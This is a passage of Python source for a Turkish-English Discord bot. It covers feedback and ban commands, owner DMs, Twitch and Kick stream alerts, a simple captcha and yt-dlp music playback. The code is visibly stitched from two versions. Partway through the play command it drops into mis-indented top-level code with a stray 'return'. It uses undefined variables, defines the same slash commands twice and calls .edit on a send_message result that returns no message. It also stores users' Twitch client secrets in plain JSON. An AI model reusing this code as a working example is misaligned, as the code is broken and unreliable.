                await sent_message.edit(view=TranslateView(f"New Feedback from {interaction.user} ({interaction.user.id}): {mesaj[:200]}"))
                feedback_sent = True
                break
            except:
                continue
    
    sent_message = await interaction.response.send_message(
        get_text(str(interaction.guild.id) if interaction.guild else "EN", "feedback_sent"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Feedback sent successfully!"))

@bot.tree.command(name="geri-bildirim-engelle", description="Kullanıcının geri bildirim göndermesini engeller (sadece security_file)")
@is_bot_owner()
async def feedback_ban_tr(interaction: discord.Interaction, kullanıcı_id: str, süre: Optional[str] = None):
    user_id = kullanıcı_id.strip('<@!>')
    
    ban_data = {
        'banned_by': interaction.user.id,
        'banned_at': datetime.datetime.now().isoformat(),
        'reason': 'Bot owner command'
    }
    
    if süre:
        try:
            duration_seconds = parse_time(süre)
            expires_at = datetime.datetime.now() + datetime.timedelta(seconds=duration_seconds)
            ban_data['expires_at'] = expires_at.isoformat()
        except:
            sent_message = await interaction.response.send_message("❌ Geçersiz süre formatı!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Invalid time format!"))
            return
    
    bot.feedback_bans[user_id] = ban_data
    bot.save_json(bot.feedback_bans, "feedback_bans.json")
    
    if süre:
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "feedback_banned", user=f"<@{user_id}>") + f" ({süre})",
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"User <@{user_id}> banned from sending feedback for {süre}"))
    else:
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "feedback_banned", user=f"<@{user_id}>"),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"User <@{user_id}> banned from sending feedback indefinitely"))

@bot.tree.command(name="geri-bildirim-kanal-kurulum", description="Geri bildirim kanalını ayarlar (sadece security_file)")
@is_bot_owner()
async def feedback_channel_setup_tr(interaction: discord.Interaction, sunucu_id: Optional[str] = None, kanal_id: Optional[str] = None):
    if sunucu_id and kanal_id:
        try:
            guild = bot.get_guild(int(sunucu_id))
            if not guild:
                sent_message = await interaction.response.send_message("❌ Sunucu bulunamadı!", ephemeral=True)
                await sent_message.edit(view=TranslateView("Server not found!"))
                return
            
            channel = guild.get_channel(int(kanal_id))
            if not channel:
                sent_message = await interaction.response.send_message("❌ Kanal bulunamadı!", ephemeral=True)
                await sent_message.edit(view=TranslateView("Channel not found!"))
                return
            
            bot.feedback_channel = channel.id
            bot.save_json(bot.feedback_channel, "feedback_channel.json")
            
            sent_message = await interaction.response.send_message(
                get_text(str(interaction.guild.id), "feedback_channel_set"),
                ephemeral=True
            )
            await sent_message.edit(view=TranslateView(f"Feedback channel set to {channel.mention} in {guild.name}"))
        except:
            sent_message = await interaction.response.send_message("❌ Geçersiz ID'ler!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Invalid IDs!"))
    else:
        # DM'e gönder
        bot.feedback_channel = None
        bot.save_json(bot.feedback_channel, "feedback_channel.json")
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "feedback_channel_reset"),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("Feedback channel reset to DM"))

@bot.tree.command(name="geri-bildirim-kanal-sıfırla", description="Geri bildirim kanalını sıfırlar (sadece security_file)")
@is_bot_owner()
async def feedback_channel_reset_tr(interaction: discord.Interaction):
    bot.feedback_channel = None
    bot.save_json(bot.feedback_channel, "feedback_channel.json")
    
    sent_message = await interaction.response.send_message(
        get_text(str(interaction.guild.id), "feedback_channel_reset"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Feedback channel reset to DM"))

@bot.tree.command(name="geri-bildirim-okundu", description="Geri bildirime yanıt verir (sadece security_file)")
@is_bot_owner()
async def feedback_read_tr(interaction: discord.Interaction, geri_bildirim_id: str, mesaj: str):
    if geri_bildirim_id not in bot.feedback_data:
        sent_message = await interaction.response.send_message("❌ Geri bildirim bulunamadı!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Feedback not found!"))
        return
    
    feedback_data = bot.feedback_data[geri_bildirim_id]
    
    try:
        user = await bot.fetch_user(feedback_data["user_id"])
        
        embed = discord.Embed(
            title="📨 Geri Bildirim Yanıtı",
            description=f"Geri bildiriminize yanıt verildi:\n\n{mesaj}",
            color=get_rainbow_color(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text=f"Geri Bildirim ID: {geri_bildirim_id}")
        
        sent_message = await user.send(embed=embed)
        await sent_message.edit(view=TranslateView(f"Feedback Response: {mesaj[:200]}"))
        
        sent_message = await interaction.response.send_message(
            f"✅ Yanıt {user.mention} kullanıcısına gönderildi!",
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"Response sent to {user.mention}"))
    except:
        sent_message = await interaction.response.send_message("❌ Kullanıcıya DM gönderilemedi!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Could not send DM to user!"))

@bot.tree.command(name="dm-yaz", description="Kullanıcıya DM gönderir (sadece security_file)")
@is_bot_owner()
async def write_dm_tr(interaction: discord.Interaction, kullanıcı_id: str, mesaj: str):
    try:
        user = await bot.fetch_user(int(kullanıcı_id))
        
        embed = discord.Embed(
            title="📨 Bot Sahibinden Mesaj",
            description=f"{mesaj}\n\n- security_file | Sampy Bot Sahibi",
            color=get_rainbow_color(),
            timestamp=datetime.datetime.now()
        )
        
        sent_message = await user.send(embed=embed)
        await sent_message.edit(view=TranslateView(f"Message from bot owner: {mesaj[:200]}"))
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "dm_sent"),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("DM sent to user!"))
    except:
        sent_message = await interaction.response.send_message("❌ Kullanıcıya DM gönderilemedi!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Could not send DM to user!"))

# Twitch Komutları
@bot.tree.command(name="twitch-bildirim-kanalı-kurulum", description="Twitch yayın bildirimlerini kurar")
@is_server_owner()
async def twitch_notification_channel_setup_tr(
    interaction: discord.Interaction, 
    twitch_client_id: str,
    twitch_secret_id: str,
    twitch_kullanıcı_adı: str,
    kanal: Optional[discord.TextChannel] = None
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    hedef_kanal = kanal or interaction.channel
    guild_id = str(interaction.guild.id)
    
    # Twitch API test
    is_live = await bot.check_twitch_live(twitch_client_id, twitch_secret_id, twitch_kullanıcı_adı)
    
    bot.twitch_settings[guild_id] = {
        'client_id': twitch_client_id,
        'client_secret': twitch_secret_id,
        'username': twitch_kullanıcı_adı,
        'discord_channel_id': hedef_kanal.id,
        'was_live': is_live
    }
    
    bot.save_json(bot.twitch_settings, "twitch_settings.json")
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "twitch_setup_complete"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Twitch notification setup complete!"))

@bot.tree.command(name="twitch-bildirim-kanalı-sıfırla", description="Twitch bildirimlerini sıfırlar")
@is_server_owner()
async def twitch_notification_channel_reset_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id in bot.twitch_settings:
        del bot.twitch_settings[guild_id]
        bot.save_json(bot.twitch_settings, "twitch_settings.json")
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "twitch_reset_complete"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Twitch notifications reset!"))

@bot.tree.command(name="get-twitch-api", description="Twitch API kimlik bilgileri alma rehberi")
async def get_twitch_api_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    view = GetTwitchAPIView()
    sent_message = await interaction.response.send_message(
        "**Twitch API Kimlik Bilgileri Rehberi**\nDilinizi seçin:",
        view=view,
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Twitch API Credentials Guide - Select your language:"))

# Kick Komutları
@bot.tree.command(name="kick-bildirim-kanalı-kurulum", description="Kick yayın bildirimlerini kurar")
@is_server_owner()
async def kick_notification_channel_setup_tr(
    interaction: discord.Interaction, 
    kick_kullanıcı_adı: str,
    kanal: Optional[discord.TextChannel] = None
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    hedef_kanal = kanal or interaction.channel
    guild_id = str(interaction.guild.id)
    
    # Kick API test
    is_live = await bot.check_kick_live(kick_kullanıcı_adı)
    
    bot.kick_settings[guild_id] = {
        'username': kick_kullanıcı_adı,
        'discord_channel_id': hedef_kanal.id,
        'was_live': is_live
    }
    
    bot.save_json(bot.kick_settings, "kick_settings.json")
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "kick_setup_complete"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Kick notification setup complete!"))

@bot.tree.command(name="kick-bildirim-kanalı-sıfırla", description="Kick bildirimlerini sıfırlar")
@is_server_owner()
async def kick_notification_channel_reset_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id in bot.kick_settings:
        del bot.kick_settings[guild_id]
        bot.save_json(bot.kick_settings, "kick_settings.json")
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "kick_reset_complete"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Kick notifications reset!"))

# Doğrulama Komutları
@bot.tree.command(name="doğrula", description="Robot doğrulaması yapar ve komut kullanma izni verir")
async def verify_tr(interaction: discord.Interaction):
    if is_verified(interaction.user, interaction.guild):
        sent_message = await interaction.response.send_message("✅ Zaten doğrulanmışsınız!", ephemeral=True)
        await sent_message.edit(view=TranslateView("You are already verified!"))
        return
    
    captcha_text = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))
    view = VerifyView(bot, captcha_text)
    
    embed = discord.Embed(
        title="🤖 Robot Doğrulaması",
        description=f"**'{captcha_text}'** yazın\n\nBu doğrulama spam ve botları engellemek içindir.",
        color=get_rainbow_color()
    )
    
    sent_message = await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
    await sent_message.edit(view=TranslateView(f"Robot Verification - Type '{captcha_text}' to verify"))

@bot.tree.command(name="ai-bilgi", description="AI hizmeti için alternatif link gösterir")
async def ai_info_tr(interaction: discord.Interaction):
    sent_message = await interaction.response.send_message(
        get_text(str(interaction.guild.id), "ai_info"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("AI Service Alternative Link: https://gemini.google.com/gem/1tmZEbdA8ar9OGoUgDU5R71_5nw_LZv-t?usp="))

# Müzik Komutları
@bot.tree.command(name="çal", description="Müzik çalar")
async def play_tr(interaction: discord.Interaction, müzik_linki: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if not interaction.user.voice:
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "music_not_in_vc"),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("You need to be in a voice channel!"))
        return
    
    await interaction.response.defer()
    
    guild_id = str(interaction.guild.id)
    
    # Ses kanalına bağlan
    if guild_id not in MUSIC_VC or not MUSIC_VC[guild_id]:
        try:
            MUSIC_VC[guild_id] = await interaction.user.voice.channel.connect()
            sent_message = await interaction.followup.send(
                get_text(guild_id, "music_join_vc")
            )
            await sent_message.edit(view=TranslateView("Joined your voice channel!"))
        except Exception as e:
            sent_message = await interaction.followup.send(f"❌ Ses kanalına bağlanılamadı: {str(e)}")
            await sent_message.edit(view=TranslateView(f"Could not connect to voice channel: {str(e)}"))
            return
    
    # Kuyruk oluştur
    if guild_id not in MUSIC_QUEUES:
        MUSIC_QUEUES[guild_id] = []
    
    if guild_id not in MUSIC_VOLUME:
        MUSIC_VOLUME[guild_id] = 0.5
    
    try:
        # Müzik bilgilerini al
        info = await YTDLSource.from_url(müzik_linki, loop=bot.loop, stream=True)
        
        # Kuyruğa ekle
        MUSIC_QUEUES[guild_id].append({
            'title': info.title,
            'url': müzik_linki,
            'requester': interaction.user
        })
        
        # Eğer çalmıyorsa çalmaya başla
        if guild_id not in MUSIC_PLAYERS or not MUSIC_PLAYERS[guild_id].is_playing():
            await play_next_tr(guild_id, interaction.channel)
        else:
            sent_message = await interaction.followup.send(f"✅ **{info.title}** kuyruğa eklendi!")
            await sent_message.edit(view=TranslateView(f"Added to queue: {info.title}"))
            
    except Exception as e:
        sent_message = await interaction.followup.send(f"❌ Müzik yüklenemedi: {str(e)}")
      await sent_message.edit(view=TranslateView(f"Added to queue: {info['title']}"))

except Exception as e:
    sent_message = await interaction.followup.send(f"❌ Müzik yüklenemedi: {str(e)}")
    await sent_message.edit(view=TranslateView(f"Could not load video information.", "videodaki bilgiler yüklenemedi."))
    return

# Check if user is in a voice channel
if not interaction.user.voice:
    if lang == "en":
        await interaction.followup.send("You must be in a voice channel to use this command.", ephemeral=True)
    else:
        await interaction.followup.send("Bu komutu kullanmak için bir ses kanalında olmalısınız.", ephemeral=True)
    return

# Get voice channel
voice_channel = interaction.user.voice.channel

# Check bot permissions
if not voice_channel.permissions_for(interaction.guild.me).connect:
    if lang == "en":
        await interaction.followup.send("I don't have permission to connect to your voice channel.", ephemeral=True)
    else:
        await interaction.followup.send("Ses kanalınıza bağlanma iznim yok.", ephemeral=True)
    return

if not voice_channel.permissions_for(interaction.guild.me).speak:
    if lang == "en":
        await interaction.followup.send("I don't have permission to speak in your voice channel.", ephemeral=True)
    else:
        await interaction.followup.send("Ses kanalınızda konuşma iznim yok.", ephemeral=True)
    return

    try:
        # Connect to voice channel if not already connected
        if not interaction.guild.voice_client:
            voice_client = await voice_channel.connect()
        else:
            voice_client = interaction.guild.voice_client
            if voice_client.channel.id != voice_channel.id:
                await voice_client.move_to(voice_channel)
        
        # Add track to queue
        track = {
            'url': url,
            'title': info['title'],
            'duration': info['duration'],
            'requester': interaction.user,
            'thumbnail': info.get('thumbnail', ''),
            'webpage_url': info.get('webpage_url', '')
        }
        
        # Initialize queue if needed
        if interaction.guild.id not in music_queues:
            music_queues[interaction.guild.id] = []
            now_playing[interaction.guild.id] = None
            music_loop[interaction.guild.id] = False
        
        music_queues[interaction.guild.id].append(track)
        
        # If nothing is playing, start playback
        if not voice_client.is_playing() and not voice_client.is_paused():
            await play_next(interaction.guild, voice_client, lang)
        else:
            if lang == "en":
                await interaction.followup.send(f"Added to queue: **{info['title']}**\nDuration: {format_duration(info['duration'])}", view=TranslateView(f"Added to queue: **{info['title']}**\nDuration: {format_duration(info['duration'])}", f"Sıraya eklendi: **{info['title']}**\nSüre: {format_duration(info['duration'])}"))
            else:
                await interaction.followup.send(f"Sıraya eklendi: **{info['title']}**\nSüre: {format_duration(info['duration'])}", view=TranslateView(f"Added to queue: **{info['title']}**\nDuration: {format_duration(info['duration'])}", f"Sıraya eklendi: **{info['title']}**\nSüre: {format_duration(info['duration'])}"))
    
    except Exception as e:
        print(f"Music play error: {e}")
        if lang == "en":
            await interaction.followup.send(f"Error playing music: {str(e)}", ephemeral=True)
        else:
            await interaction.followup.send(f"Müzik çalma hatası: {str(e)}", ephemeral=True)

async def play_next(guild, voice_client, lang="en"):
    """Play next song in queue"""
    if guild.id not in music_queues or not music_queues[guild.id]:
        # Start idle timer
        idle_timers[guild.id] = asyncio.create_task(idle_disconnect(guild, voice_client))
        return
    
    # Cancel idle timer if exists
    if guild.id in idle_timers:
        idle_timers[guild.id].cancel()
        del idle_timers[guild.id]
    
    track = music_queues[guild.id].pop(0)
    now_playing[guild.id] = track
    
    try:
        # Download and play audio
        ydl_opts = {
            'format': 'bestaudio/best',
            'quiet': True,
            'no_warnings': True,
            'default_search': 'auto',
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(track['url'], download=False)
            url2 = info['url']
        
        # Get FFmpeg options based on OS
        ffmpeg_options = {
            'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 -nostdin',
            'options': '-vn -filter:a "volume=0.8"'
        }
        
        # Use FFmpegPCMAudio with corrected options
        source = discord.FFmpegPCMAudio(
            url2,
            before_options=ffmpeg_options['before_options'],
            options=ffmpeg_options['options']
        )
        
        # Play audio
        voice_client.play(source, after=lambda e: asyncio.run_coroutine_threadsafe(
            play_next(guild, voice_client, lang), 
            bot.loop
        ) if e is None else None)
        
        # Send now playing message
        channel = guild.system_channel or next((ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages), None)
        if channel:
            embed = discord.Embed(
                title="🎵 Now Playing" if lang == "en" else "🎵 Şimdi Çalıyor",
                description=f"**{track['title']}**",
                color=discord.Color.green()
            )
            embed.add_field(
                name="Duration" if lang == "en" else "Süre",
                value=format_duration(track['duration']),
                inline=True
            )
            embed.add_field(
                name="Requested by" if lang == "en" else "İsteyen",
                value=track['requester'].mention,
                inline=True
            )
            if track['thumbnail']:
                embed.set_thumbnail(url=track['thumbnail'])
            
            view = NowPlayingView(guild.id, lang)
            await channel.send(embed=embed, view=view)
    
    except Exception as e:
        print(f"Play next error: {e}")
        # Try next song
        await play_next(guild, voice_client, lang)

async def idle_disconnect(guild, voice_client):
    """Disconnect bot after 5 minutes of idle"""
    await asyncio.sleep(300)  # 5 minutes
    
    if voice_client.is_connected() and not voice_client.is_playing() and not voice_client.is_paused():
        try:
            await voice_client.disconnect()
            # Clean up music data
            if guild.id in music_queues:
                del music_queues[guild.id]
            if guild.id in now_playing:
                del now_playing[guild.id]
            if guild.id in music_loop:
                del music_loop[guild.id]
            
            channel = guild.system_channel or next((ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages), None)
            if channel:
                await channel.send(view=TranslateView(
                    "Disconnected due to inactivity.",
                    "Hareketsizlik nedeniyle bağlantı kesildi."
                ))
        except:
            pass

def format_duration(seconds):
    """Format seconds to MM:SS or HH:MM:SS"""
    if seconds is None:
        return "Live"
    
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    seconds = seconds % 60
    
    if hours > 0:
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    else:
        return f"{minutes:02d}:{seconds:02d}"

class NowPlayingView(discord.ui.View):
    """View for music controls"""
    def __init__(self, guild_id, lang="en"):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.lang = lang
    
    @discord.ui.button(label="⏸️ Pause", style=discord.ButtonStyle.secondary)
    async def pause_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.guild.voice_client and interaction.guild.voice_client.is_playing():
            interaction.guild.voice_client.pause()
            if self.lang == "en":
                await interaction.response.send_message("Music paused.", ephemeral=True)
            else:
                await interaction.response.send_message("Müzik duraklatıldı.", ephemeral=True)
    
    @discord.ui.button(label="▶️ Resume", style=discord.ButtonStyle.secondary)
    async def resume_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.guild.voice_client and interaction.guild.voice_client.is_paused():
            interaction.guild.voice_client.resume()
            if self.lang == "en":
                await interaction.response.send_message("Music resumed.", ephemeral=True)
            else:
                await interaction.response.send_message("Müzik devam ediyor.", ephemeral=True)
    
    @discord.ui.button(label="⏭️ Skip", style=discord.ButtonStyle.primary)
    async def skip_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.guild.voice_client and (interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused()):
            interaction.guild.voice_client.stop()
            if self.lang == "en":
                await interaction.response.send_message("Skipped current song.", ephemeral=True)
            else:
                await interaction.response.send_message("Şarkı atlandı.", ephemeral=True)
    
    @discord.ui.button(label="🔁 Loop", style=discord.ButtonStyle.success)
    async def loop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.guild_id not in music_loop:
            music_loop[self.guild_id] = False
        
        music_loop[self.guild_id] = not music_loop[self.guild_id]
        
        if music_loop[self.guild_id]:
            button.style = discord.ButtonStyle.danger
            button.label = "🔁 Looping"
            if self.lang == "en":
                await interaction.response.send_message("Loop enabled.", ephemeral=True)
            else:
                await interaction.response.send_message("Döngü etkinleştirildi.", ephemeral=True)
        else:
            button.style = discord.ButtonStyle.success
            button.label = "🔁 Loop"
            if self.lang == "en":
                await interaction.response.send_message("Loop disabled.", ephemeral=True)
            else:
                await interaction.response.send_message("Döngü devre dışı.", ephemeral=True)
        
        await interaction.message.edit(view=self)
    
    @discord.ui.button(label="⏹️ Stop", style=discord.ButtonStyle.danger)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.guild.voice_client:
            # Clear queue
            if interaction.guild.id in music_queues:
                music_queues[interaction.guild.id].clear()
            
            # Stop playback
            interaction.guild.voice_client.stop()
            
            # Disconnect
            await interaction.guild.voice_client.disconnect()
            
            # Clean up
            if interaction.guild.id in music_queues:
                del music_queues[interaction.guild.id]
            if interaction.guild.id in now_playing:
                del now_playing[interaction.guild.id]
            if interaction.guild.id in music_loop:
                del music_loop[interaction.guild.id]
            
            if self.lang == "en":
                await interaction.response.send_message("Music stopped and disconnected.", ephemeral=True)
            else:
                await interaction.response.send_message("Müzik durduruldu ve bağlantı kesildi.", ephemeral=True)

# Feedback System
feedback_data = {}
feedback_channel = None
feedback_banned_users = set()

class FeedbackModal(discord.ui.Modal, title="Feedback / Geri Bildirim"):
    """Modal for sending feedback"""
    def __init__(self, lang="en"):
        super().__init__()
        self.lang = lang
        
        self.feedback_input = discord.ui.TextInput(
            label="Your feedback" if lang == "en" else "Geri bildiriminiz",
            style=discord.TextStyle.paragraph,
            placeholder="Type your feedback here..." if lang == "en" else "Geri bildiriminizi buraya yazın...",
            required=True,
            max_length=1000
        )
        self.add_item(self.feedback_input)
    
    async def on_submit(self, interaction: discord.Interaction):
        global feedback_data
        
        # Check if user is banned
        if interaction.user.id in feedback_banned_users:
            if self.lang == "en":
                await interaction.response.send_message("You are banned from sending feedback.", ephemeral=True)
            else:
                await interaction.response.send_message("Geri bildirim göndermeniz yasaklandı.", ephemeral=True)
            return
        
        # Generate feedback ID
        feedback_id = str(uuid.uuid4())[:8]
        
        # Store feedback
        feedback_data[feedback_id] = {
            'user_id': interaction.user.id,
            'user_name': str(interaction.user),
            'message': self.feedback_input.value,
            'timestamp': datetime.now().isoformat(),
            'read': False,
            'response': None
        }
        
        # Send to feedback channel or DM
        embed = discord.Embed(
            title="📩 New Feedback" if self.lang == "en" else "📩 Yeni Geri Bildirim",
            color=discord.Color.blue()
        )
        embed.add_field(name="ID", value=feedback_id, inline=True)
        embed.add_field(name="User", value=f"{interaction.user.mention} ({interaction.user.id})", inline=True)
        embed.add_field(name="Message", value=self.feedback_input.value[:500] + ("..." if len(self.feedback_input.value) > 500 else ""), inline=False)
        embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        try:
            if feedback_channel:
                await feedback_channel.send(embed=embed)
            else:
                # Send to bot owner via DM
                owner = await bot.fetch_user(owner_id)
                await owner.send(embed=embed)
            
            if self.lang == "en":
                await interaction.response.send_message(
                    f"Thank you for your feedback! Your feedback ID: `{feedback_id}`",
                    ephemeral=True
                )
            else:
                await interaction.response.send_message(
                    f"Geri bildiriminiz için teşekkürler! Geri bildirim ID'niz: `{feedback_id}`",
                    ephemeral=True
                )
        except Exception as e:
            print(f"Feedback error: {e}")
            if self.lang == "en":
                await interaction.response.send_message("Error sending feedback. Please try again later.", ephemeral=True)
            else:
                await interaction.response.send_message("Geri bildirim gönderilirken hata oluştu. Lütfen daha sonra tekrar deneyin.", ephemeral=True)

@bot.tree.command(name="feedback", description="Send feedback to bot owner")
async def feedback_command(interaction: discord.Interaction):
    """Send feedback to bot owner"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    modal = FeedbackModal(lang="en")
    await interaction.response.send_modal(modal)

@bot.tree.command(name="geri-bildirim", description="Bot sahibine geri bildirim gönder")
async def geri_bildirim_command(interaction: discord.Interaction):
    """Bot sahibine geri bildirim gönder"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    modal = FeedbackModal(lang="tr")
    await interaction.response.send_modal(modal)

@bot.tree.command(name="feedback-ban", description="Ban user from sending feedback (Owner only)")
@commands.is_owner()
async def feedback_ban(interaction: discord.Interaction, user_id: str, time: str = None):
    """Ban user from sending feedback"""
    try:
        user_id_int = int(user_id)
        feedback_banned_users.add(user_id_int)
        
        # Parse time if provided
        ban_duration = None
        if time:
            if time.endswith('d'):
                ban_duration = int(time[:-1]) * 24 * 3600
            elif time.endswith('h'):
                ban_duration = int(time[:-1]) * 3600
            elif time.endswith('m'):
                ban_duration = int(time[:-1]) * 60
        
        await interaction.response.send_message(f"User {user_id} banned from feedback." + 
                                               (f" Duration: {time}" if time else ""))
        
        # Schedule unban if duration provided
        if ban_duration:
            asyncio.create_task(unban_after_duration(user_id_int, ban_duration))
    
    except ValueError:
        await interaction.response.send_message("Invalid user ID.", ephemeral=True)

@bot.tree.command(name="geri-bildirim-engelle", description="Kullanıcının geri bildirim göndermesini engelle (Sadece Sahip)")
@commands.is_owner()
async def geri_bildirim_engelle(interaction: discord.Interaction, user_id: str, süre: str = None):
    """Kullanıcının geri bildirim göndermesini engelle"""
    try:
        user_id_int = int(user_id)
        feedback_banned_users.add(user_id_int)
        
        # Süreyi parse et
        ban_süresi = None
        if süre:
            if süre.endswith('g'):
                ban_süresi = int(süre[:-1]) * 24 * 3600
            elif süre.endswith('s'):
                ban_süresi = int(süre[:-1]) * 3600
            elif süre.endswith('d'):
                ban_süresi = int(süre[:-1]) * 60
        
        await interaction.response.send_message(f"Kullanıcı {user_id} geri bildirimden engellendi." + 
                                               (f" Süre: {süre}" if süre else ""))
        
        # Süreli ban için zamanlayıcı
        if ban_süresi:
            asyncio.create_task(unban_after_duration(user_id_int, ban_süresi, lang="tr"))
    
    except ValueError:
        await interaction.response.send_message("Geçersiz kullanıcı ID.", ephemeral=True)

async def unban_after_duration(user_id: int, duration: int, lang="en"):
    """Unban user after specified duration"""
    await asyncio.sleep(duration)
    feedback_banned_users.discard(user_id)
    
    # Notify owner
    owner = await bot.fetch_user(owner_id)
    if lang == "en":
        await owner.send(f"User {user_id} has been unbanned from feedback.")
    else:
        await owner.send(f"Kullanıcı {user_id} geri bildirim yasağı kaldırıldı.")

@bot.tree.command(name="feedback-read", description="Mark feedback as read and respond (Owner only)")
@commands.is_owner()
async def feedback_read(interaction: discord.Interaction, feedback_id: str, message: str):
    """Mark feedback as read and respond to user"""
    if feedback_id not in feedback_data:
        await interaction.response.send_message("Feedback not found.", ephemeral=True)
        return
    
    feedback = feedback_data[feedback_id]
    
    # Send response to user
    try:
        user = await bot.fetch_user(feedback['user_id'])
        
        embed = discord.Embed(
            title="📬 Feedback Response",
            color=discord.Color.green()
        )
        embed.add_field(name="Your Feedback", value=feedback['message'][:500], inline=False)
        embed.add_field(name="Response", value=message, inline=False)
        embed.set_footer(text=f"Feedback ID: {feedback_id}")
        
        await user.send(embed=embed)
        
        # Update feedback
        feedback['read'] = True
        feedback['response'] = message
        feedback['response_time'] = datetime.now().isoformat()
        
        await interaction.response.send_message(f"Response sent to user {user.mention}.")
    
    except Exception as e:
        await interaction.response.send_message(f"Error sending response: {str(e)}", ephemeral=True)

@bot.tree.command(name="geri-bildirim-okundu", description="Geri bildirimi okundu olarak işaretle ve yanıtla (Sadece Sahip)")
@commands.is_owner()
async def geri_bildirim_okundu(interaction: discord.Interaction, geri_bildirim_id: str, mesaj: str):
    """Geri bildirimi okundu olarak işaretle ve kullanıcıya yanıtla"""
    if geri_bildirim_id not in feedback_data:
        await interaction.response.send_message("Geri bildirim bulunamadı.", ephemeral=True)
        return
    
    feedback = feedback_data[geri_bildirim_id]
    
    # Kullanıcıya yanıt gönder
    try:
        user = await bot.fetch_user(feedback['user_id'])
        
        embed = discord.Embed(
            title="📬 Geri Bildirim Yanıtı",
            color=discord.Color.green()
        )
        embed.add_field(name="Geri Bildiriminiz", value=feedback['message'][:500], inline=False)
        embed.add_field(name="Yanıt", value=mesaj, inline=False)
        embed.set_footer(text=f"Geri Bildirim ID: {geri_bildirim_id}")
        
        await user.send(embed=embed)
        
        # Geri bildirimi güncelle
        feedback['read'] = True
        feedback['response'] = mesaj
        feedback['response_time'] = datetime.now().isoformat()
        
        await interaction.response.send_message(f"Yanıt kullanıcı {user.mention}'a gönderildi.")
    
    except Exception as e:
        await interaction.response.send_message(f"Yanıt gönderilirken hata: {str(e)}", ephemeral=True)

@bot.tree.command(name="write-dm", description="Send DM to user (Owner only)")
@commands.is_owner()
async def write_dm(interaction: discord.Interaction, user_id: str, message: str):
    """Send direct message to user"""
    try:
        user = await bot.fetch_user(int(user_id))
        
        embed = discord.Embed(
            title="Message from Bot Owner",
            description=message,
            color=discord.Color.blue()
        )
        embed.set_footer(text="security_file | Sampy Bot Owner")
        
        await user.send(embed=embed)
        await interaction.response.send_message(f"Message sent to {user.mention}.", ephemeral=True)
    
    except Exception as e:
        await interaction.response.send_message(f"Error sending message: {str(e)}", ephemeral=True)

@bot.tree.command(name="dm-yaz", description="Kullanıcıya DM gönder (Sadece Sahip)")
@commands.is_owner()
async def dm_yaz(interaction: discord.Interaction, kullanıcı_id: str, mesaj: str):
    """Kullanıcıya direkt mesaj gönder"""
    try:
        user = await bot.fetch_user(int(kullanıcı_id))
        
        embed = discord.Embed(
            title="Bot Sahibinden Mesaj",
            description=mesaj,
            color=discord.Color.blue()
        )
        embed.set_footer(text="security_file | Sampy Bot Sahibi")
        
        await user.send(embed=embed)
